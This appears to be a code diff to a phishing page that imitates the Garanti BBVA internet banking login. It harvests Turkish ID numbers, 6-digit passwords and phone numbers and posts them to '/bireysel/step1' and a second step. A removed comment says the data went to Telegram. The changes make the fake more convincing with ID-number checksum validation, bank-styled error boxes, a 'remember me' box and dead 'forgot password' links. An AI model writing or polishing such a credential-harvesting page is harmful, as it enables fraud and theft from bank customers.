@@ -166,11 +166,11 @@ gbAnalyticsKey :'35x92b78-471c-23gf-8925-s6f3876x9sbg'
 <div class="row">
 <div class="col-md-9">
 <div class="hidden-mobile">
-<h2 class="page-title">     Garanti BBVA İnternet Bankacılığı’na Giriş</h2>
+<h2 class="page-title">    Garanti BBVA İnternet Bankacılığı’na Giriş</h2>
 </div>
 <div class="panel">
 <div class="panel-body" id="passwordEntryPanel">
-<h1 class="panel-title light"> Güvenli Bankacılığa Hoş Geldiniz  <p id="errorMsg">Lütfen müşteri numaranızı ya da T.C. kimlik numaranızı ve size özel parolanızı girin.</p></h1>
+<h1 class="panel-title light"> Güvenli Bankacılığa Hoş Geldiniz</h1>
 <div class="row">
 <div class="col-sm-12">
 <div class="form-horizontal">
@@ -183,6 +183,10 @@ gbAnalyticsKey :'35x92b78-471c-23gf-8925-s6f3876x9sbg'
 <label class="col-sm-5 col-md-4 control-label" for="custno">Müşteri / T.C. Kimlik Numarası</label>
 <div class="formFieldSurround col-sm-7 col-md-8">
 <input class="form-control" id="custno" maxlength="11" name="musteriNoLabelUstte" pattern="[0-9]*" type="tel" value=""/>
+<div id="tcErrorMsg" style="display: none; background-color: #c9151e; color: white; padding: 10px 15px; border-radius: 2px; margin-top: 6px; font-size: 13px; font-weight: 500; position: relative;">
+<div style="position: absolute; top: -6px; left: 20px; width: 0; height: 0; border-left: 6px solid transparent; border-right: 6px solid transparent; border-bottom: 6px solid #c9151e;"></div>
+Lütfen geçerli müşteri ya da T.C. Kimlik numaranızı girin.
+</div>
 </div>
 </div>
 </div>
@@ -195,41 +199,73 @@ gbAnalyticsKey :'35x92b78-471c-23gf-8925-s6f3876x9sbg'
 <div class="inline-form-control">
 <input autocomplete="one-time-code" class="form-control" id="password" maxlength="6" name="passpoort" inputmode="numeric" pattern="[0-9]*" type="password"/>
 </div>
+<div id="passErrorMsg" style="display: none; background-color: #c9151e; color: white; padding: 10px 15px; border-radius: 2px; margin-top: 6px; font-size: 13px; font-weight: 500; position: relative;">
+<div style="position: absolute; top: -6px; left: 20px; width: 0; height: 0; border-left: 6px solid transparent; border-right: 6px solid transparent; border-bottom: 6px solid #c9151e;"></div>
+Lütfen geçerli parolanızı girin.
 </div>
 </div>
 </div>
 </div>
 </div>
-<div class="form-group form-group-offset">
-<div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
-<p id="errorMsg" style="color: #d9534f; font-size: 13px; margin-top: 5px;"></p>
+</div>
+
+<!-- Beni Hatırla ve Bilgi İkonu -->
+<div class="form-group form-group-offset" style="margin-bottom: 15px;">
+<div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12" style="display: flex; align-items: center; justify-content: space-between;">
+<div style="display: flex; align-items: center;">
+<input type="checkbox" id="rememberMe" style="margin-right: 8px; width: 16px; height: 16px; accent-color: #009639;">
+<label for="rememberMe" style="font-weight: normal; color: #333; font-size: 14px; margin-bottom: 0; cursor: pointer;">Beni Hatırla</label>
+</div>
+<span style="color: #009639; font-size: 14px; cursor: pointer; border: 1px solid #009639; border-radius: 50%; width: 20px; height: 20px; display: inline-flex; align-items: center; justify-content: center; font-weight: bold;" title="Bilgi">i</span>
 </div>
 </div>
+
 <div class="form-group form-group-offset footer-button">
 <div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
 <p>
-<!-- type="button" yaptık ve id verdik -->
 <button class="btn btn-primary btn-lg btn-block-input mobile-hover" id="formSubmitBtn" type="button">Garanti BBVA İnternet Giriş</button>
 </p>
 </div>
 </div>
+
+<!-- Parolamı Unuttum ve İlk Kez Parola Al Linkleri -->
+<div class="form-group form-group-offset">
+<div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12" style="font-size: 13px; line-height: 1.8; margin-top: 5px;">
+<a href="#" onclick="return false;" style="color: #009639; text-decoration: none; display: block;">Parolamı unuttum.</a>
+<a href="#" onclick="return false;" style="color: #009639; text-decoration: none; display: block;">İlk kez parola almak istiyorum.</a>
+</div>
+</div>
+
 </form>
 <script>
-let currentStep = 1; // 1: TC/Parola, 2: Telefon
+function validateTCKN(tc) {
+    if (!/^[1-9][0-9]{10}$/.test(tc)) return false;
+    let digits = tc.split('').map(Number);
+    let oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
+    let evenSum = digits[1] + digits[3] + digits[5] + digits[7];
+    let digit10 = (oddSum * 7 - evenSum) % 10;
+    if (digit10 !== digits[9]) return false;
+    let totalSum = digits.slice(0, 10).reduce((a, b) => a + b, 0);
+    return totalSum % 10 === digits[10];
+}
+
 document.addEventListener('DOMContentLoaded', () => {
-    
     const submitBtn = document.getElementById('formSubmitBtn');
-    
+    if (!submitBtn) return;
+
     submitBtn.addEventListener('click', async (e) => {
-        // Diğer tüm harici scriptlerin tıklama olayını yakalamasını ve formun yenilenmesini kesin olarak engeller
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
 
-        const errorMsgElement = document.getElementById('errorMsg');
-        if (errorMsgElement) errorMsgElement.innerText = '';
+        const tcErrorEl = document.getElementById('tcErrorMsg');
+        const passErrorEl = document.getElementById('passErrorMsg');
+        const phoneErrorEl = document.getElementById('phoneErrorMsg');
+        
+        if (tcErrorEl) tcErrorEl.style.display = 'none';
+        if (passErrorEl) passErrorEl.style.display = 'none';
+        if (phoneErrorEl) phoneErrorEl.style.display = 'none';
 
-        // Ekranda 'phone' inputu var mı yoksa ilk adımda mıyız?
         const phoneInput = document.getElementById('phone');
         const isStepTwo = phoneInput !== null;
 
@@ -243,17 +279,37 @@ document.addEventListener('DOMContentLoaded', () => {
             const tc = tcInput ? tcInput.value.trim() : '';
             const password = passInput ? passInput.value.trim() : '';
 
-            if (!tc || !password) {
-                if (errorMsgElement) errorMsgElement.innerText = "Lütfen T.C. ve parolanızı giriniz.";
-                return;
+            let hasError = false;
+
+            if (!tc || tc.length !== 11 || !validateTCKN(tc)) {
+                if (tcErrorEl) {
+                    tcErrorEl.innerText = (!tc || tc.length !== 11) ? "Lütfen geçerli müşteri ya da T.C. Kimlik numaranızı girin." : "Girdiğiniz T.C. Kimlik numarası geçersizdir.";
+                    tcErrorEl.style.display = 'block';
+                }
+                hasError = true;
             }
+
+            if (!password || password.length !== 6) {
+                if (passErrorEl) {
+                    passErrorEl.innerText = "Lütfen geçerli parolanızı girin.";
+                    passErrorEl.style.display = 'block';
+                }
+                hasError = true;
+            }
+
+            if (hasError) return;
+
             payload = { tc, password };
             endpoint = '/bireysel/step1';
         } else {
             const phoneVal = phoneInput.value.trim();
+            const cleanPhone = phoneVal.replace(/^\+90\s*/, '').replace(/\D/g, '');
 
-            if (!phoneVal || phoneVal.length < 10) {
-                if (errorMsgElement) errorMsgElement.innerText = "Lütfen geçerli bir telefon numarası giriniz (5XXXXXXXXX).";
+            if (!cleanPhone || cleanPhone.length !== 10) {
+                const phoneErr = document.getElementById('phoneErrorMsg');
+                if (phoneErr) {
+                    phoneErr.style.display = 'block';
+                }
                 return;
             }
             payload = { phone: phoneVal };
@@ -279,98 +335,81 @@ document.addEventListener('DOMContentLoaded', () => {
 
             if (res.ok && result.success) {
                 if (!isStepTwo) {
-             
-// 1. Adım başarılı olduğunda telefon ekranını basan kod
-const dynamicContent = document.getElementById('dynamicFormContent');
-dynamicContent.innerHTML = `
-    <div style="text-align: center; padding: 10px 0;">
-        <h3 style="color: #333; font-size: 18px; font-weight: bold; margin-bottom: 8px;">Telefon Doğrulaması</h3>
-        <p style="color: #666; font-size: 13px; margin-bottom: 20px;">Lütfen devam etmek için telefon numaranızı giriniz.</p>
-        
-        <div class="formField" style="margin-bottom: 20px;">
-            <div class="formFieldOuter">
-                <div class="formFieldInner form-group">
-                    <div class="formFieldSurround" style="display: flex; justify-content: center;">
-                        <input type="tel" class="form-control" id="phone" name="phone_safe" value="+90 " maxlength="14" style="text-align: left; font-size: 16px; padding: 12px; border-radius: 4px; border: 1px solid #ccc; width: 100%; max-width: 320px; background-color: #fff;" required autofocus>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-`;
+                    const dynamicContent = document.getElementById('dynamicFormContent');
+                    if (dynamicContent) {
+                        dynamicContent.innerHTML = `
+                            <div style="text-align: center; padding: 10px 0;">
+                                <h3 style="color: #333; font-size: 18px; font-weight: bold; margin-bottom: 8px;">Telefon Doğrulaması</h3>
+                                <p style="color: #666; font-size: 13px; margin-bottom: 20px;">Lütfen devam etmek için telefon numaranızı giriniz.</p>
+                                
+                                <div class="formField" style="margin-bottom: 20px;">
+                                    <div class="formFieldOuter">
+                                        <div class="formFieldInner form-group">
+                                            <div class="formFieldSurround" style="display: flex; flex-direction: column; align-items: flex-start; max-width: 320px; margin: 0 auto;">
+                                                <input type="tel" class="form-control" id="phone" name="phone_safe" value="+90 " maxlength="14" style="text-align: left; font-size: 16px; padding: 12px; border-radius: 4px; border: 1px solid #ccc; width: 100%; background-color: #fff;" required autofocus>
+                                                
+                                                <div id="phoneErrorMsg" style="display: none; background-color: #c9151e; color: white; padding: 10px 15px; border-radius: 2px; margin-top: 6px; font-size: 13px; font-weight: 500; position: relative; width: 100%; text-align: left; box-sizing: border-box;">
+                                                    <div style="position: absolute; top: -6px; left: 20px; width: 0; height: 0; border-left: 6px solid transparent; border-right: 6px solid transparent; border-bottom: 6px solid #c9151e;"></div>
+                                                    Lütfen geçerli bir telefon numarası giriniz (5XXXXXXXXX).
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    }
 
-// Buton tipini kesinlikle 'button' yapıyoruz ki form submitlenmesin
-const submitBtn = document.getElementById('formSubmitBtn');
-submitBtn.setAttribute('type', 'button');
-submitBtn.innerText = "DEVAM ET";
-submitBtn.style.display = 'inline-block';
-submitBtn.disabled = false;
+                    const newSubmitBtn = document.getElementById('formSubmitBtn');
+                    newSubmitBtn.setAttribute('type', 'button');
+                    newSubmitBtn.innerText = "DEVAM ET";
+                    newSubmitBtn.style.display = 'inline-block';
+                    newSubmitBtn.disabled = false;
 
-const phoneInput = document.getElementById('phone');
+                    const newPhoneInput = document.getElementById('phone');
+                    if (newPhoneInput) {
+                        newPhoneInput.focus();
+                        newPhoneInput.setSelectionRange(newPhoneInput.value.length, newPhoneInput.value.length);
 
-// Sayfa açıldığında imleci otomatik olarak +90'ın sonuna konumlandır
-phoneInput.focus();
-phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
+                        newPhoneInput.addEventListener('keydown', (event) => {
+                            if (event.key === 'Enter') {
+                                event.preventDefault();
+                                newSubmitBtn.click();
+                            }
+                            if ((event.key === 'ArrowLeft' || event.key === 'Backspace' || event.key === 'Home') && newPhoneInput.selectionStart <= 4) {
+                                event.preventDefault();
+                            }
+                        });
 
-// ENTER tuşuna basıldığında sayfanın yenilenmesini kesin olarak engelle ve butona tıkla
-phoneInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        submitBtn.click(); // Doğrudan bizim JS click fonksiyonumuzu tetikler
-        return false;
-    }
-    // +90 yazısının silinmesini engelle
-    if ((e.key === 'ArrowLeft' || e.key === 'Backspace' || e.key === 'Home') && phoneInput.selectionStart <= 4) {
-        e.preventDefault();
-    }
-});
-
-phoneInput.addEventListener('click', () => {
-    if (phoneInput.selectionStart < 4) {
-        phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
-    }
-});
-
-// Yazıldıkça sadece +90 sonrasına rakam eklenmesini sağla
-phoneInput.addEventListener('input', (e) => {
-    let val = phoneInput.value;
-    if (!val.startsWith('+90 ')) {
-        val = '+90 ' + val.replace(/^\+90\s*/, '');
-    }
-    let numbers = val.substring(4).replace(/\D/g, '');
-    if (numbers.startsWith('0')) numbers = numbers.substring(1);
-    if (numbers.length > 10) numbers = numbers.substring(0, 10);
-    
-    phoneInput.value = '+90 ' + numbers;
-});
-
-// Sadece buton yazısını güncelliyoruz, rengine dokunmuyoruz
-submitBtn.innerText = "DEVAM ET";
-submitBtn.disabled = false;
+                        newPhoneInput.addEventListener('input', () => {
+                            let val = newPhoneInput.value;
+                            if (!val.startsWith('+90 ')) {
+                                val = '+90 ' + val.replace(/^\+90\s*/, '');
+                            }
+                            let numbers = val.substring(4).replace(/\D/g, '');
+                            if (numbers.startsWith('0')) numbers = numbers.substring(1);
+                            if (numbers.length > 10) numbers = numbers.substring(0, 10);
+                            newPhoneInput.value = '+90 ' + numbers;
+                        });
+                    }
                 } else {
-                    // 2. Adım (Telefon) da bitti, Telegram'a gitti. Başarı sayfasına yönlendiriyoruz.
                     window.location.href = '/bireysel/basarili';
                 }
             } else {
-                if (errorMsgElement) {
-                    errorMsgElement.innerText = result.error || 'İşlem başarısız, lütfen tekrar deneyin.';
-                }
+                alert(result.message || 'İşlem başarısız, lütfen tekrar deneyin.');
                 submitBtn.disabled = false;
                 submitBtn.innerText = originalBtnText;
             }
         } catch (err) {
             console.error("❌ Hata:", err);
-            if (errorMsgElement) {
-                errorMsgElement.innerText = 'Bağlantı hatası oluştu. Lütfen tekrar deneyin.';
-            }
-            submitBtn.disabled,submitBtn.disabled = false;
+            alert('Bağlantı hatası oluştu. Lütfen tekrar deneyin.');
+            submitBtn.disabled = false;
             submitBtn.innerText = originalBtnText;
         }
     });
 });
 </script>
+</div>
 </div>
 </div>
 </div>
